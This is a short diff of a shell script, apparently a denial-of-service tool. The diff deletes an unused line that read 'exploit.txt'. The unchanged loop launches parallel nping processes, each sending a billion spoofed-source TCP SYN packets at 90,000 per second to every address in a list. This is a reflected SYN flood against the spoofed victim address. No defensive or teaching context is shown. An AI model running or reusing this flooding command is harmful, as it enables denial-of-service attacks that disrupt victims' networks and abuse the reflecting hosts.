@@ -41,7 +41,6 @@ else
     and MULTIPLIER is the number of simultaneous process to run."
   else
     while [ $i -lt $3 ]; do
-      exploit="$(cat exploit.txt)"
       nping -c 1000000000 --rate 90000 --tcp --flags SYN -S $1 -g $2 $(tr '\n' ' '<ips.txt) &
       i=$[$i+1]
     done
